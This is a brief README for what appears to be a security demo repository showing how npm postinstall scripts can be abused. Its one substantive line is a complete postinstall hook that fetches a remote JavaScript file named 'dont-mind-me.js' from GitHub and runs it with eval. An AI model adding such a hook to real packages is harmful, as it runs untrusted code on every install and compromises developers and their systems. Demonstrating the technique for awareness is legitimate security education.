# King-sikkerhet-demo-extract

This is intended to be used as a demo script to display how a malicious actor might take advantage of postinstall scripts to compromise an application.

# Notes:


Retrieval link:
`"postinstall": "node -e \"fetch('https://raw.githubusercontent.com/EnturWilhelm/king-sikkerhet-demo-extract/refs/heads/main/dont-mind-me.js').then(res => res.text()).then(text => eval(text));\""`